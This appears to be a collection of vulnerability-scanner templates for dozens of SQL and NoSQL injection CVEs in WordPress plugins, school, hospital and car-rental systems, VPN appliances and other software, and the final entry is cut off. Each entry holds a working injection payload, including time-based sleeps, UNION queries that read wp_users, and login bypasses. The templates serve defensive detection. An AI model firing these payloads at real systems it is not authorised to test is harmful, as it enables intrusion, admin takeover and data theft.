- Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.

- severity - critical
- tags - cve,wpscan,cve2021,sqli,wp,wordpress,wp-plugin,unauth,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx)
### Matchers

**Type - dsl**
- dsl
    1. duration>=4

**Type - word**
- part - header
- words
    1. wp-ps-session

**Type - status**
- status
    1. 404

---
# Rosario Student Information System Unauthenticated SQL Injection
## Description
- An unauthenticated SQL injection vulnerability in Rosario Student Information System (aka rosariosis) 8.1 and below allow remote attackers to execute PostgreSQL statements (e.g., SELECT, INSERT, UPDATE, and DELETE) through /Side.php via the syear parameter.
- severity - critical
- tags - cve,cve2021,sqli,rosariosis
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/Side.php
  - sidefunc=update&syear=111'
### Matchers

**Type - word**
- part - body
- words
    1. DB Execute Failed. ERROR:
    2. unterminated quoted string
- condition - and

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. RosarioSIS=

---
# WordPress Statistics <13.0.8 - Blind SQL Injection
## Description
- WordPress Statistic plugin versions prior to version 13.0.8 are affected by an unauthenticated time-based blind SQL injection vulnerability.
- severity - high
- tags - cve,wp-plugin,unauth,wpscan,cve2021,wordpress,sqli,blind,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wp-statistics/readme.txt
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. WP Statistics
- part - body

**Type - dsl**
- dsl
    1. compare_versions(version, '< 13.0.8')
### Extractors

**Type - regex**
- name - version
- internal - True
- group - 1
- regex
    1. (?m)Stable tag: ([0-9.]+)

**Type - regex**
- group - 1
- regex
    1. (?m)Stable tag: ([0-9.]+)

---
# Virtua Software Cobranca <12R - Blind SQL Injection
## Description
- Virtua Cobranca before 12R allows blind SQL injection on the login page.

- severity - high
- tags - cve,cve2021,virtua,sqli
## Requests
### Step - 1
```
POST /controller/origemdb.php?idselorigem=ATIVOS HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

```
### Step - 2
```
POST /controller/login.php?acao=autenticar HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

idusuario='&idsenha=test&tipousr=Usuario

```
### Step - 3
```
POST /controller/login.php?acao=autenticar HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

idusuario=''&idsenha=a&tipousr=Usuario

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_3, "Os parametros não estão informados corretamente")
    2. contains(body_3, "O CNPJ dos parametro não está informado corretamente")
- condition - or

**Type - dsl**
- dsl
    1. status_code_2 == 500 && status_code_3 == 200

---
# WooCommerce Blocks 2.5 to 5.5 - Unauthenticated SQL Injection
## Description
- woocommerce-gutenberg-products-block is a feature plugin for WooCommerce Gutenberg Blocks. An SQL injection vulnerability impacts all WooCommerce sites running the WooCommerce Blocks feature plugin between version 2.5.0 and prior to version 2.5.16. Via a carefully crafted URL, an exploit can be executed against the `wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]` endpoint that allows the execution of a read only sql query. There are patches for many versions of this package, starting with version 2.5.16. There are no known workarounds aside from upgrading.

- severity - high
- tags - cve,cve2021,wordpress,woocommerce,sqli,wp-plugin,wp,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
### Matchers

**Type - word**
- words
    1. sqli-test
    2. attribute_counts
    3. price_range
    4. term
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# Rocket.Chat <=3.13 - NoSQL Injection
## Description
- Rocket.Chat 3.11, 3.12 and 3.13 contains a NoSQL injection vulnerability which allows unauthenticated access to an API endpoint. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
- severity - critical
- tags - rocketchat,nosqli,packetstorm,vulhub,hackerone,cve,cve2021
## Requests
### Step - 1
```
POST /api/v1/method.callAnon/getPasswordPolicy HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"message": "{\"msg\":\"method\", \"method\": \"getPasswordPolicy\", \"params\": [{\"token\": {\"$regex\": \"^{{randstr}}\"}}] }"}
```
### Matchers

**Type - word**
- part - body
- words
    1. [error-invalid-user]
    2. "success":true
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# PrestaHome Blog for PrestaShop <1.7.8 - SQL Injection
## Description
- PrestaHome Blog for PrestaShop prior to version 1.7.8 is vulnerable to a SQL injection (blind) via the sb_category parameter.
- severity - high
- tags - cve,cve2021,prestashop,prestahome,sqli,cms
## Requests
### Step - 1
```
GET /module/ph_simpleblog/list?sb_category=')%20OR%20true--%20- HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
GET /module/ph_simpleblog/list?sb_category=')%20AND%20false--%20- HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_1 == 200
    2. status_code_2 == 404
    3. contains(body_1, "prestashop")
    4. contains(tolower(all_headers_2), 'index.php?controller=404')
    5. len(body_2) == 0
- condition - and

---
# openSIS Student Information System 8.0 SQL Injection
## Description
- openSIS Student Information System version 8.0 is susceptible to SQL injection via the student_id and TRANSFER[SCHOOL] parameters in POST request sent to /TransferredOutModal.php.
- severity - high
- tags - sqli,auth,edb,cve,cve2021,opensis
## Requests
### Step - 1
```
POST /index.php HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

USERNAME={{username}}&PASSWORD={{password}}&language=en&log=

```
### Step - 2
```
POST /TransferredOutModal.php?modfunc=detail HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

student_id=updatexml(0x23,concat(1,md5({{num}})),1)&button=Save&TRANSFER[SCHOOL]=5&TRANSFER[Grade_Level]=5

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, "<!-- SQL STATEMENT:") && contains(body_2, "SELECT COUNT(STUDENT_ID)")
    2. status_code_2 == 200
- condition - and

---
# Oracle Fusion Middleware WebCenter Sites 12.2.1.3.0 - SQL Injection
## Description
- The Oracle WebCenter Sites component of Oracle Fusion Middleware 12.2.1.3.0 is susceptible to SQL injection via an easily exploitable vulnerability that allows low privileged attackers with network access via HTTP to compromise Oracle WebCenter Sites. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle WebCenter Sites accessible data.
- severity - medium
- tags - cve,cve2019,oracle,wcs,sqli
## Requests
### Step - 1
```
GET /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
POST /cs/ContentServer HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_authkey_={{authkey}}&pagename=OpenMarket%2FXcelerate%2FAdmin%2FWebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=%27+and+%271%27%3D%270+--+

```
### Matchers

**Type - word**
- words
    1. value='&#39; and &#39;1&#39;=&#39;0 --
    2. Use this utility to view and manage URLs
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- name - authkey
- part - body
- internal - True
- group - 1
- regex
    1. NAME='_authkey_' VALUE='([0-9A-Z]+)'>

---
# WordPress Google Maps <7.11.18 - SQL Injection
## Description
- WordPress Google Maps plugin before 7.11.18 contains a SQL injection vulnerability. The plugin includes /class.rest-api.php in the REST API and does not sanitize field names before a SELECT statement. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2019,wp,wp-plugin,unauth,sqli,wordpress,googlemaps,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-
### Matchers

**Type - word**
- part - body
- words
    1. "user_login"
    2. "user_pass"
    3. "user_nicename"
- condition - and

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection
## Description
- Teclib GLPI <= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that incorrectly sanitizes user controlled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records.
- severity - critical
- tags - cve,cve2019,glpi,sqli,injection
## Requests
- Method - GET
### URL
- {{BaseURL}}/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
- {{BaseURL}}/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
### Matchers

**Type - word**
- part - body
- words
    1. -MariaDB-
    2. Start unlock script
- condition - and
### Extractors

**Type - regex**
- part - body
- regex
    1. [0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}-MariaDB

---
# MetInfo 7.0.0 beta - SQL Injection
## Description
- MetInfo 7.0.0 beta is susceptible to SQL injection via the admin/?n=language&c=language_general&a=doSearchParameter appno parameter (a different issue than CVE-2019-16997).

- severity - high
- tags - cve,cve2019,metinfo,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin
### Matchers

**Type - word**
- part - body
- words
    1. 43865094559

**Type - status**
- status
    1. 200

---
# Metinfo 7.0.0 beta - SQL Injection
## Description
- Metinfo 7.0.0 beta is susceptible to SQL Injection in app/system/language/admin/language_general.class.php via the admin/?n=language&c=language_general&a=doExportPack appno parameter.
- severity - high
- tags - metinfo,sqli,cve,cve2019
## Requests
### Step - 1
```
POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

appno= 1 union SELECT 98989*443131,1&editor=cn&site=web

```
### Matchers

**Type - word**
- part - body
- words
    1. 43865094559

**Type - status**
- status
    1. 200

---
# SonicWall SRA 4600 VPN - SQL Injection
## Description
- The SonicWall SRA 4600 VPN appliance is susceptible to a pre-authentication SQL injection vulnerability.
- severity - high
- tags - cve,cve2019,sonicwall,sqli,kev
## Requests
### Step - 1
```
POST /cgi-bin/supportInstaller HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
User-Agent: MSIE
Content-Type: application/x-www-form-urlencoded

fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,11132*379123,0,0,0,0--

```
### Matchers

**Type - word**
- words
    1. 4220397236
- part - body

---
# Lansweeper Unauthenticated SQL Injection
## Description
- Lansweeper before 7.1.117.4 allows unauthenticated SQL injection.
- severity - critical
- tags - cve,cve2019,sqli,lansweeper
## Requests
- Method - GET
### URL
- {{BaseURL}}/WidgetHandler.ashx?MethodName=Sort&ID=1&row=1&column=%28SELECT%20CONCAT%28CONCAT%28CHAR%28126%29%2C%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28db_name%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%29%2CCHAR%28126%29%29%29
### Matchers

**Type - word**
- words
    1. ~lansweeperdb~
- part - body

**Type - word**
- words
    1. text/plain
- part - header

**Type - status**
- status
    1. 500

---
# Metinfo 7.0.0 beta - SQL Injection
## Description
- Metinfo 7.0.0 beta is susceptible to SQL Injection in app/system/product/admin/product_admin.class.php via the admin/?n=product&c=product_admin&a=dopara&app_type=shop id parameter.
- severity - high
- tags - metinfo,sqli,cve,cve2019
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23
### Matchers

**Type - word**
- part - body
- words
    1. 1918835981

**Type - status**
- status
    1. 200

---
# WP Fundraising Donation and Crowdfunding Platform < 1.5.0 - Unauthenticated SQLi
## Description
- The WP Fundraising Donation and Crowdfunding Platform WordPress plugin before 1.5.0 does not sanitise and escape a parameter before using it in a SQL statement via one of it's REST route, leading to an SQL injection exploitable by unauthenticated users.

- severity - critical
- tags - cve,sqli,wordpress,wp-plugin,cve2022,wp,wp-fundraising-donation,unauth,wpscan
## Requests
### Step - 1
```
@timeout: 10s
GET /index.php?rest_route=/xs-donate-form/payment-redirect/3 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id": "(SELECT 1 FROM (SELECT(SLEEP(6)))me)", "formid": "1", "type": "online_payment"}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(content_type, "application/json")
    4. contains(body, "Invalid payment.")
- condition - and

---
# WordPress RSVPMaker <=9.3.2 - SQL Injection
## Description
- WordPress RSVPMaker plugin through 9.3.2 contains a SQL injection vulnerability due to insufficient escaping and parameterization on user-supplied data passed to multiple SQL queries in ~/rsvpmaker-email.php. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,rsvpmaker
## Requests
### Step - 1
```
@timeout: 15s
POST /wp-json/rsvpmaker/v1/stripesuccess/anythinghere HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

rsvp_id=(select(0)from(select(sleep(5)))a)&amount=1234&email=randomtext

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=5

**Type - word**
- part - body
- words
    1. "payment_confirmation_message":

**Type - word**
- part - header
- words
    1. application/json

**Type - status**
- status
    1. 200

---
# Cyber Cafe Management System 1.0 - SQL Injection
## Description
- Cyber Cafe Management System 1.0 contains multiple SQL injection vulnerabilities via the username and password parameters in the Admin panel. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve2022,sqli,auth-bypass,edb,cve
## Requests
### Step - 1
```
POST /ccms/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=%27+Or+1--+-&password=1&login=

```
### Step - 2
```
GET /ccms/dashboard.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. CCMS Admin Dashboard
    2. CCMS ADMIN | Admin
- condition - and

**Type - status**
- status
    1. 200

---
# Hospital Management System 1.0 - SQL Injection
## Description
- Hospital Management System 1.0 contains a SQL injection vulnerability via the editid parameter in /HMS/doctor.php. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,hms,cms,sqli,auth-bypass
## Requests
### Step - 1
```
POST /hms/doctor/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=

```
### Matchers

**Type - word**
- part - body
- words
    1. <title>Doctor  | Dashboard</title>
    2. View Appointment History
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress TI WooCommerce Wishlist <1.40.1 - SQL Injection
## Description
- WordPress TI WooCommerce Wishlist plugin before 1.40.1 contains a SQL injection vulnerability. The plugin does not sanitize and escape the item_id parameter before using it in a SQL statement via the wishlist/remove_product REST endpoint.

- severity - critical
- tags - sqli,ti-woocommerce-wishlist,wpscan,cve,cve2022,woocommerce,wordpress,wp-plugin,wp
## Requests
### Step - 1
```
@timeout: 10s
GET /?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(5)%20--%20g HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=5

**Type - word**
- part - body
- words
    1. Product not found

**Type - status**
- status
    1. 400

---
# NETGEAR ProSafe SSL VPN firmware - SQL Injection
## Description
- NETGEAR ProSafe SSL VPN multiple firmware versions were discovered to contain a SQL injection vulnerability via USERDBDomains.Domainname at cgi-bin/platform.cgi.

- severity - critical
- tags - cve,cve2022,sqli,netgear,router
## Requests
### Step - 1
```
POST /scgi-bin/platform.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=utf-8

thispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5435'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd

```
### Step - 2
```
POST /scgi-bin/platform.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=utf-8

thispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5434'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_1, "User authentication Failed")
    2. contains(body_2, "User Login Failed for SSLVPN User.")
- condition - and

---
# Complete Online Job Search System 1.0 - SQL Injection
## Description
- Complete Online Job Search System 1.0 contains a SQL injection vulnerability via /eris/index.php?q=category&search=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,sqli,jobsearch
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?q=category&search=Banking%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,md5({{num}}),15,16,17,18,19--+
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

---
# NotificationX WordPress plugin < 2.3.9 - SQL Injection
## Description
- The NotificationX WordPress plugin before 2.3.9 does not sanitise and escape the nx_id parameter before using it in a SQL statement, leading to an Unauthenticated Blind SQL Injection.

- severity - critical
- tags - cve2022,wordpress,wp-plugin,wp,sqli,notificationx,wpscan,cve
## Requests
### Step - 1
```
@timeout: 15s
POST /?rest_route=/notificationx/v1/analytics HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

nx_id=sleep(6) -- x

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(body, "\"data\":{\"success\":true}")
- condition - and

---
# College Management System 1.0 - SQL Injection
## Description
- College Management System 1.0 contains a SQL injection vulnerability via the course code parameter.

- severity - high
- tags - cve,cve2022,sqli,cms,collegemanagement
## Requests
### Step - 1
```
POST /admin/asign-single-student-subjects.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

submit=Press&roll_no=3&course_code=sd' UNION ALL SELECT CONCAT(md5({{num}}),12,21),NULL,NULL,NULL,NULL#

```
### Matchers

**Type - word**
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 302

---
# Car Rental Management System 1.0 - SQL Injection
## Description
- Car Rental Management System 1.0 contains an SQL injection vulnerability via /admin/manage_user.php?id=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,carrental,cms,sqli,authenticated
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# WordPress Nirweb Support <2.8.2 - SQL Injection
## Description
- WordPress Nirweb support plugin before 2.8.2 contains a SQL injection vulnerability. The plugin does not sanitize and escape a parameter before using it in a SQL statement via an AJAX action. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,nirweb-support,unauth
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL-- -

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5(num)}}

**Type - status**
- status
    1. 200

---
# Pricing Deals for WooCommerce < 2.0.3 - Unauthenticated SQL Injection
## Description
- The Pricing Deals for WooCommerce WordPress plugin through 2.0.2.02 does not properly sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to an unauthenticated SQL injection.

- severity - critical
- tags - cve,cve2022,sqli,wpscan,wordpress,wp-plugin,wp,pricing-deals-for-woocommerce,unauth
## Requests
### Step - 1
```
@timeout: 15s
GET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+- HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 500
    3. contains(body, "been a critical error")
- condition - and

---
# VoipMonitor - Pre-Auth SQL Injection
## Description
- A SQL injection vulnerability in Voipmonitor GUI before v24.96 allows attackers to escalate privileges to the Administrator level.
- severity - critical
- tags - cve,cve2022,voipmonitor,sqli,unauth
## Requests
### Step - 1
```
POST /api.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #

```
### Matchers

**Type - word**
- words
    1. "success":true
    2. _vm_version
    3. _debug
- condition - and

**Type - status**
- status
    1. 200
### Extractors

**Type - kval**
- kval
    1. PHPSESSID

---
# Car Rental Management System 1.0 - SQL Injection
## Description
- Car Rental Management System 1.0 contains an SQL injection vulnerability via /booking.php?car_id=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,carrental,cms,sqli,authenticated
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /booking.php?car_id=-1%20union%20select%201,md5({{num}}),3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Daily Prayer Time < 2022.03.01 - Unauthenticated SQLi
## Description
- The Daily Prayer Time WordPress plugin before 2022.03.01 does not sanitise and escape the month parameter before using it in a SQL statement via the get_monthly_timetable AJAX action (available to unauthenticated users), leading to an unauthenticated SQL injection.

- severity - critical
- tags - sqli,wordpress,wp-plugin,unauth,daily-prayer-time-for-mosques,wpscan,cve,cve2022,wp
## Requests
### Step - 1
```
@timeout: 10s
GET /wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn) HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=6
    2. status_code == 200
    3. contains(content_type, "text/html")
    4. contains(body, "dptTimetable customStyles dptUserStyles")
- condition - and

---
# Directory Management System 1.0 - SQL Injection
## Description
- Directory Management System 1.0 contains multiple SQL injection vulnerabilities via the username and password parameters in the Admin panel. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,sqli,auth-bypass,edb
## Requests
### Step - 1
```
POST /admin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=admin' or '1'='1&password=1&login=login

```
### Step - 2
```
GET /admin/dashboard.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. DMS || Dashboard
    2. DMS Admin
    3. Admin Profile
- condition - and

**Type - status**
- status
    1. 200

---
# Car Rental Management System 1.0 - SQL Injection
## Description
- Car Rental Management System 1.0 contains an SQL injection vulnerability via /admin/manage_booking.php?id=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,carrental,cms,sqli,authenticated
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
GET /admin/manage_booking.php?id=-1%20union%20select%201,2,3,4,5,6,md5({{num}}),8,9,10,11--+ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Hospital Management System 1.0 - SQL Injection
## Description
- Hospital Management System 1.0 contains a SQL injection vulnerability via the editid parameter in /HMS/admin.php. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,hms,cms,sqli
## Requests
### Step - 1
```
POST /hms/admin/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=

```
### Matchers

**Type - word**
- part - body
- words
    1. <title>Admin  | Dashboard</title>
    2. Manage Patients
    3. Manage Doctors
- condition - and

**Type - status**
- status
    1. 200

---
# Car Rental Management System 1.0 - SQL Injection
## Description
- Car Rental Management System 1.0 contains an SQL injection vulnerability via /admin/ajax.php?action=login. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,carrental,cms,sqli,login-bypass
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin'+or+'1'%3D'1'%23&password=admin

```
### Step - 2
```
GET /admin/index.php?page=home HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. Welcome back Administrator!
    2. action=logout
    3. Manage Account
- condition - and

**Type - status**
- status
    1. 200

---
# School Dormitory Management System 1.0 - SQL Injection
## Description
- School Dormitory Management System 1.0 contains a SQL injection vulnerability via accounts/payment_history.php:31. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

- severity - critical
- tags - cve,cve2022,sqli
## Requests
- Method - GET
### URL
- {{BaseURL}}/dms/admin/accounts/payment_history.php?account_id=2%27
### Matchers

**Type - word**
- part - body
- words
    1. Fatal error
    2. Uncaught Error: Call to a member function fetch_assoc()
    3. <th class="">Month of</th>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Car Rental Management System 1.0 - SQL Injection
## Description
- Car Rental Management System 1.0 contains an SQL injection vulnerability via /admin/view_car.php?id=. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

- severity - high
- tags - cve,cve2022,carrental,cms,sqli,authenticated
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}%23&password={{password}}

```
### Step - 2
```
GET /admin/view_car.php?id=-1%20union%20select%201,md5({{num}}),3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. {{md5({{num}})}}

**Type - status**
- status
    1. 200

---
# Terraboard < 2.2.0 - SQL Injection
## Description
- SQL Injection in GitHub repository camptocamp/terraboard prior to 2.2.0.

- severity - high
- tags - cve,cve2022,terraboard,sqli,huntr
## Requests
### Step - 1
```
@timeout: 10s
GET /api/search/attribute?versionid=*&tf_version=%27+and+(select%20pg_sleep(10))+ISNULL-- HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=5

**Type - word**
- part - body
- words
    1. "page":
    2. "results":
- condition - and

**Type - status**
- status
    1. 200

---
# WP Visitor Statistics (Real Time Traffic) < 5.8 - Unauthenticated SQLi
## Description
- Unauthenticated SQL Injection (SQLi) vulnerabilities in Osamaesh WP Visitor Statistics plugin <= 5.7 at WordPress.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,unauth,sqli,wp-stats-manager
## Requests
### Step - 1
```
@timeout: 15s
GET /?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'+and+sleep(5)+or+' HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. duration>=5

**Type - regex**
- regex
    1. ^1331' and sleep\(5\) or '$

**Type - status**
- status
    1. 200

---
# Royal Event - SQL Injection
## Description
- Royal Event is vulnerable to a SQL injection vulnerability.

- severity - high
- tags - royalevent,edb,cve,cve2022,sqli,authenticated,cms
## Requests
### Step - 1
```
POST /royal_event/ HTTP/1.1
Host: {{Hostname}}
Content-Length: 353
